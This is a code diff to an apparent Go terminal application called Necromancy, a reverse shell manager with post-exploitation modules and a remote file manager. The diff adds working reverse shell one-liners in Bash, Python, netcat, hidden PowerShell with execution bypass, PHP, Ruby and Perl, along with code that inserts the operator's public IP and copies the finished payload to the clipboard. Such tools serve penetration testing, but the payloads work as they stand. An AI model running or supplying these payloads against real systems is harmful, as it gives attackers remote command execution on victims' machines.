@@ -13,6 +13,7 @@ import (
 	"github.com/Aryma-f4/necromancy/core"
 	"github.com/Aryma-f4/necromancy/modules"
 	"github.com/Aryma-f4/necromancy/pty"
+	"github.com/Aryma-f4/necromancy/utils"
 	"github.com/gdamore/tcell/v2"
 	"github.com/rivo/tview"
 )
@@ -78,21 +79,51 @@ type payloadDefinition struct {
 }
 
 func payloadDefinitions() []payloadDefinition {
+	// Get the current port from global config
+	port := core.GlobalConfig.Ports
+	if port == "" {
+		port = "4444"
+	}
+
+	// If multiple ports, use the first one
+	ports := strings.Split(port, ",")
+	firstPort := strings.TrimSpace(ports[0])
+
 	return []payloadDefinition{
 		{
 			Name:        "Bash",
 			Description: "Classic bash TCP reverse shell",
-			Command:     "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1",
+			Command:     fmt.Sprintf("bash -i >& /dev/tcp/YOUR_IP/%s 0>&1", firstPort),
 		},
 		{
 			Name:        "Python",
 			Description: "Python PTY reverse shell",
-			Command:     `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'`,
+			Command:     fmt.Sprintf(`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'`, firstPort),
 		},
 		{
 			Name:        "Netcat",
 			Description: "FIFO-based netcat reverse shell",
-			Command:     "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP 4444 >/tmp/f",
+			Command:     fmt.Sprintf("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP %s >/tmp/f", firstPort),
+		},
+		{
+			Name:        "PowerShell",
+			Description: "PowerShell reverse shell",
+			Command:     fmt.Sprintf(`powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("YOUR_IP",%s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`, firstPort),
+		},
+		{
+			Name:        "PHP",
+			Description: "PHP reverse shell",
+			Command:     fmt.Sprintf(`php -r '$sock=fsockopen("YOUR_IP",%s);exec("/bin/sh -i <&3 >&3 2>&3");'`, firstPort),
+		},
+		{
+			Name:        "Ruby",
+			Description: "Ruby reverse shell",
+			Command:     fmt.Sprintf(`ruby -rsocket -e'exit if fork;c=TCPSocket.new("YOUR_IP","%s");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`, firstPort),
+		},
+		{
+			Name:        "Perl",
+			Description: "Perl reverse shell",
+			Command:     fmt.Sprintf(`perl -e 'use Socket;$i="YOUR_IP";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`, firstPort),
 		},
 	}
 }
@@ -178,7 +209,7 @@ func newBannerView() *tview.TextView {
 	banner.SetBackgroundColor(tcell.ColorBlack)
 	banner.SetWrap(false)
 	banner.SetWordWrap(false)
-	banner.SetText(getBannerFromFile() + "\n[gray] v1.1 Stable Release - Advanced Shell Manager [-]\n[gray] https://github.com/Aryma-f4/necromancy [-]\n")
+	banner.SetText(getBannerFromFile() + "\n[gray] v1.2 Stable Release - Advanced Shell Manager [-]\n[gray] https://github.com/Aryma-f4/necromancy [-]\n")
 
 	return banner
 }
@@ -219,18 +250,19 @@ func (a *App) Setup() {
 		SetDynamicColors(true).
 		SetTextAlign(tview.AlignCenter)
 	header.SetBackgroundColor(tcell.ColorBlack)
-	header.SetText("[yellow]Necromancy Main Menu[white]  [gray]v1.1 Stable Release[-]\n[green]Interactive reverse shell manager[-]")
+	header.SetText("[yellow]Necromancy Main Menu[white]  [gray]v1.2 Stable Release[-]\n[green]Interactive reverse shell manager[-]")
 
 	a.menuList = tview.NewList().
 		AddItem("View Sessions", "List all active reverse shells", 's', a.showSessionsList).
 		AddItem("Show Payloads", "Show reverse shell payloads", 'p', a.showPayloads).
 		AddItem("Show Modules", "List available post-exploitation modules", 'm', a.showAllModules).
+		AddItem("Network Info", "Show local and public IP addresses", 'n', a.showNetworkInfo).
 		AddItem("Interfaces", "List local network interfaces", 'i', a.showInterfaces).
 		AddItem("Exit", "Quit application", 'q', func() {
 			a.tviewApp.Stop()
 		})
 
-	a.menuList.SetBorder(true).SetTitle(" Necromancy Main Menu v1.1 Stable Release ")
+	a.menuList.SetBorder(true).SetTitle(" Necromancy Main Menu v1.2 Stable Release ")
 	a.menuList.SetBackgroundColor(tcell.ColorBlack)
 
 	// Set highlight colors for better visibility
@@ -529,15 +561,18 @@ func (a *App) openFileManager(id int) {
 		return
 	}
 
-	// Launch file manager UI
-	app := tview.NewApplication()
-	fileManager := modules.NewFileManagerUI(modules.NewFileManagerSession(session), app)
+	// Create file manager with existing app
+	fms := modules.NewFileManagerSession(session)
+	fileManager := modules.NewFileManagerUI(fms, a.tviewApp, func() {
+		// Return to session actions
+		a.showSessionActions(id)
+	})
 
 	// Create layout with banner
 	bannerView := tview.NewTextView().
 		SetDynamicColors(true).
 		SetTextAlign(tview.AlignCenter).
-		SetText(getBannerFromFile() + "\n[gray]v1.1 Stable Release - File Manager[-]\n[blue]Interactive File Management for Target Systems[-]")
+		SetText(getBannerFromFile() + "\n[gray]v1.2 Stable Release - File Manager[-]\n[blue]Interactive File Management for Target Systems[-]")
 
 	bannerView.SetBackgroundColor(tcell.ColorBlack)
 
@@ -548,19 +583,16 @@ func (a *App) openFileManager(id int) {
 	// Set up input capture to handle escape key
 	mainLayout.SetInputCapture(func(event *tcell.EventKey) *tcell.EventKey {
 		if event.Key() == tcell.KeyEscape {
-			app.Stop()
+			// Return to session actions
+			a.showSessionActions(id)
 			return nil
 		}
 		return event
 	})
 
-	// Run file manager
-	if err := app.SetRoot(mainLayout, true).EnableMouse(true).Run(); err != nil {
-		log.Printf("File manager UI error: %v", err)
-	}
-
-	// Return to session actions after file manager closes
-	a.showSessionActions(id)
+	// Switch to file manager page
+	a.pages.AddPage("file_manager", wrapWithBanner(mainLayout, true), true, true)
+	a.pages.SwitchToPage("file_manager")
 }
 
 func (a *App) showInterfaces() {
@@ -577,8 +609,50 @@ func (a *App) showInterfaces() {
 	tv.SetBackgroundColor(tcell.ColorBlack)
 	a.pages.AddPage("interfaces", wrapWithBanner(tv, true), true, true)
 }
+
+func (a *App) showNetworkInfo() {
+	tv := tview.NewTextView().SetDynamicColors(true)
+	tv.SetBorder(true).SetTitle(" Network Information (Esc to go back) ")
+
+	// Get network info
+	networkInfo := utils.GetNetworkInfo()
+	infoText := utils.FormatNetworkInfo(networkInfo)
+
+	// Add additional info
+	infoText += "\n[yellow]Listening Ports:[white]\n"
+	if core.GlobalConfig.Ports != "" {
+		ports := strings.Split(core.GlobalConfig.Ports, ",")
+		for i, port := range ports {
+			infoText += fmt.Sprintf("  [%d] Port %s\n", i+1, strings.TrimSpace(port))
+		}
+	} else {
+		infoText += "  No ports configured\n"
+	}
+
+	infoText += "\n[gray]Press Esc to return to menu[-]"
+
+	tv.SetText(infoText)
+	tv.SetInputCapture(func(event *tcell.EventKey) *tcell.EventKey {
+		if event.Key() == tcell.KeyEscape {
+			a.pages.SwitchToPage("menu")
+			return nil
+		}
+		return event
+	})
+	tv.SetBackgroundColor(tcell.ColorBlack)
+	a.pages.AddPage("network_info", wrapWithBanner(tv, true), true, true)
+}
+
 func (a *App) showPayloads() {
 	payloads := payloadDefinitions()
+
+	// Get network info for IP replacement
+	networkInfo := utils.GetNetworkInfo()
+	localIP := networkInfo["local_ip"]
+	publicIP := networkInfo["public_ip"]
+	if publicIP != "Unknown" && !utils.IsPrivateIP(publicIP) {
+		localIP = publicIP // Use public IP if available
+	}
 
 	list := tview.NewList()
 	list.SetBorder(true).SetTitle(" Payload Types ")
@@ -595,14 +669,16 @@ func (a *App) showPayloads() {
 		SetDynamicColors(true).
 		SetTextAlign(tview.AlignCenter)
 	status.SetBackgroundColor(tcell.ColorBlack)
-	status.SetText("[gray]Enter to inspect | c to copy selected payload | Esc to go back[-]")
+	status.SetText("[gray]Enter to inspect | c to copy selected payload | r to refresh IP | Esc to go back[-]")
 
 	updatePreview := func(index int) {
 		if index < 0 || index >= len(payloads) {
 			return
 		}
 		item := payloads[index]
-		preview.SetText(fmt.Sprintf("[yellow]%s[white]\n[green]%s[white]\n\n%s", item.Name, item.Description, item.Command))
+		// Replace YOUR_IP with actual IP
+		displayCmd := strings.ReplaceAll(item.Command, "YOUR_IP", localIP)
+		preview.SetText(fmt.Sprintf("[yellow]%s[white]\n[green]%s[white]\n\n[cyan]%s[white]", item.Name, item.Description, displayCmd))
 	}
 
 	for i, payload := range payloads {
@@ -633,12 +709,26 @@ func (a *App) showPayloads() {
 		if event.Key() == tcell.KeyRune && (event.Rune() == 'c' || event.Rune() == 'C') {
 			index := list.GetCurrentItem()
 			if index >= 0 && index < len(payloads) {
-				if err := copyTextToClipboard(payloads[index].Command); err != nil {
+				// Replace YOUR_IP with actual IP before copying
+				cmdToCopy := strings.ReplaceAll(payloads[index].Command, "YOUR_IP", localIP)
+				if err := copyTextToClipboard(cmdToCopy); err != nil {
 					status.SetText(fmt.Sprintf("[red]Copy failed:[white] %v", err))
 				} else {
-					status.SetText(fmt.Sprintf("[green]Copied:[white] %s", payloads[index].Name))
+					status.SetText(fmt.Sprintf("[green]Copied to clipboard:[white] %s", payloads[index].Name))
 				}
 			}
+			return nil
+		}
+		if event.Key() == tcell.KeyRune && (event.Rune() == 'r' || event.Rune() == 'R') {
+			// Refresh network info
+			networkInfo = utils.GetNetworkInfo()
+			localIP = networkInfo["local_ip"]
+			publicIP = networkInfo["public_ip"]
+			if publicIP != "Unknown" && !utils.IsPrivateIP(publicIP) {
+				localIP = publicIP
+			}
+			updatePreview(list.GetCurrentItem())
+			status.SetText("[green]Network info refreshed[-]")
 			return nil
 		}
 		return event
